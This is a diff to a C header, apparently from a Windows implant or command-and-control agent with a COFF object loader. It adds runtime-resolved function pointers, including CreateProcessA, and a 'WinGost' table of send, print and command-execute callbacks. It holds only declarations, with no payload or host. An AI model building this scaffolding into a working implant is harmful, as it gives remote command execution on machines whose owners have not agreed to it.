@@ -5,8 +5,11 @@
 #include <winhttp.h>
 
 
-//#define WIN_API_FUNC(name, ret_type, ...) ret_type(*name)(__VA_ARGS__);
+//#define WIN_API_FUNC(name, ret_type, ...) ret_type(WINAPI *name)(__VA_ARGS__);
 #define WIN_API_FUNC(name, ret_type, ...) ret_type(WINAPI *name)(__VA_ARGS__)
+
+//#define CUSTOM_FUNC(name, ret_type, ...) ret_type(*name)(__VA_ARGS__);
+#define CUSTOM_FUNC(name, ret_type, ...) ret_type(*name)(__VA_ARGS__)
 
 typedef struct _COFF_HEADER {
     WORD Machine;
@@ -50,6 +53,9 @@ typedef struct _CUSTOM_LDR_DATA_TABLE_ENTRY {
     ULONG TimeDateStamp;
 } CUSTOM_LDR_DATA_TABLE_ENTRY,*PCUSTOM_LDR_DATA_TABLE_ENTRY;
 
+// Forward declarations
+typedef struct _FUNCTION_TABLE FUNCTION_TABLE, *PFUNCTION_TABLE;
+
 typedef struct _KERNEL32_TABLE {
     WIN_API_FUNC(LoadLibraryA, HMODULE, LPCSTR lpLibFileName);
     WIN_API_FUNC(GetProcAddress, FARPROC, HMODULE hModule, LPCSTR lpProcName);
@@ -64,6 +70,7 @@ typedef struct _KERNEL32_TABLE {
     WIN_API_FUNC(VirtualProtect, BOOL, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
     WIN_API_FUNC(GetProcessHeap, HANDLE, VOID);
     WIN_API_FUNC(Sleep, VOID, DWORD dwMilliseconds);
+    WIN_API_FUNC(CreateProcessA, BOOL, LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
     // WIN_API_FUNC(HeapAlloc, LPVOID, HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
     // WIN_API_FUNC(HeapFree, BOOL, HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
 } KERNEL32_TABLE, *PKERNEL32_TABLE;
@@ -74,7 +81,13 @@ typedef struct _NTDLL_TABLE {
     WIN_API_FUNC(RtlFreeHeap, BOOLEAN, PVOID HeapHandle, ULONG Flags, PVOID BaseAddress);
 } NTDLL_TABLE, *PNTDLL_TABLE;
 
+typedef struct _WINGOST_TABLE {
+    // Add WinGost function pointers here if needed
+    CUSTOM_FUNC(gostSend, void, char* message, int message_len, const wchar_t* apiID, PFUNCTION_TABLE ft);
+    CUSTOM_FUNC(gostPrint, void, char* message, BOOL format, int message_len, PFUNCTION_TABLE ft);
+    CUSTOM_FUNC(gostExecute, void, const char* command, PFUNCTION_TABLE ft);
 
+} WINGOST_TABLE, *PWINGOST_TABLE;
 
 typedef struct _WINHTTP_TABLE {
     // Add WinHTTP function pointers here if needed
@@ -92,4 +105,5 @@ typedef struct _FUNCTION_TABLE {
     KERNEL32_TABLE Kernel32;
     WINHTTP_TABLE WinHttp;
     NTDLL_TABLE Ntdll;
-} FUNCTION_TABLE, *PFUNCTION_TABLE;
+    WINGOST_TABLE WinGost;
+} FUNCTION_TABLE;
